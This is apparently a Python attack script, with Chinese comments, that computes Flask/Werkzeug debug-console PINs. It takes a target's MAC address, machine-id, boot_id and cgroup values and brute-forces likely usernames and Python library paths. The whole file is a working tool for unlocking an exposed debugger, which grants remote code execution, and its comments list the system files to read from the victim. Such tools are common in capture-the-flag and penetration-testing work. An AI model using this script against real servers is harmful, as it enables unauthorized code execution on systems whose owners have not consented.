import hashlib
from itertools import chain
import sys
import os
import util


def genFinalMachineId(machineid, bootid, cgroup):
    linux = ""
    linux = linux + machineid
    if os.path.exists(cgroup):
        with open(cgroup, "rb") as f:
            cgroup = f.readline().strip().rpartition(b"/")[2].decode()
    if linux != "":
        linux = linux + cgroup
    else:
        linux = linux + bootid
        linux = linux + cgroup

    return linux


# 0.15.5(2019-7-17)之前                              没有docker容器的machine-id
# 0.15.5(2019-7-17) - 0.16.0(2019-9-19)             修改docker容器的machine-id的正则
# 2.0.0(2021-5-11)之后                               加密方式为sha1
def getPin(username, path, address, machineid, bootid, cgroup):
    """
    Machine Id
    """
    probably_public_bits = [
        username,  # username
        'flask.app',  # 固定
        'Flask',  # 固定
        path  # moddir,报错从页面获得,猜版本号也可以
    ]
    mac_address = ""
    if ":" not in address:
        mac_address = address
    else:
        mac_address = str(int(address.replace(":", ""), 16))

    private_bits = [
        mac_address,  # /sys/class/net/eth0/address
        # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
        genFinalMachineId(machineid, bootid, cgroup)
    ]
    if util.compare("3.6", path):
        h = hashlib.sha1()  # 3.8以后采用sha1加密
    else:
        h = hashlib.md5()
    # 3.6采用MD5加密
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x: x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num
    print("      PIN: " + rv + "          cookie_name: " + cookie_name)




if __name__ == "__main__":
    usernames = ["root", "docker", "www-data"]
    paths = ["/usr/local/lib/python{}/site-packages/flask/app.pyc".format("2.6"),
             "/usr/local/lib/python{}/site-packages/flask/app.pyc".format("2.7")] + \
            ["/usr/local/lib/python{}/site-packages/flask/app.py".format("3." + str(i)) for i in range(0, 12)]
    result = util.getArgvs(sys.argv[1:])
    # print(result)
    if "address" not in result.keys():
        sys.exit("必须输入网卡地址")
    if ("username" not in result.keys()) and ("path" in result.keys()):
        for username in usernames:
            print("username:" + username, end="")
            getPin(username, result["path"], result["address"],
                   result["machineid"], result["bootid"], result["cgroup"])
        sys.exit("您没有输入username，已穷举用户名。可自行向列表添加用户名")
    if ("path" not in result.keys()) and ("username" in result.keys()):
        for path in paths:
            print("python版本:" + path, end="")
            # python2为pyc，centos中路径为/usr/lib/python2.7/site-packages/flask/app.pyc
            getPin(result["username"], path,
                   result["address"],
                   result["machineid"], result["bootid"], result["cgroup"])
        sys.exit("您没有输入path(moddir)，已穷举路径。")
    if ("username" and "path") not in result.keys():
        for username in usernames:
            for path in paths:
                print("username:" + username + ",path(moddir):" + path, end="")
                getPin(username, path,
                       result["address"],
                       result["machineid"], result["bootid"], result["cgroup"])
        sys.exit("您没有输入path(moddir)以及username用户名，已穷举路径。")
    # print("PIN:")
    getPin(result["username"], result["path"], result["address"], result["machineid"], result["bootid"],
           result["cgroup"])
    # getPin()
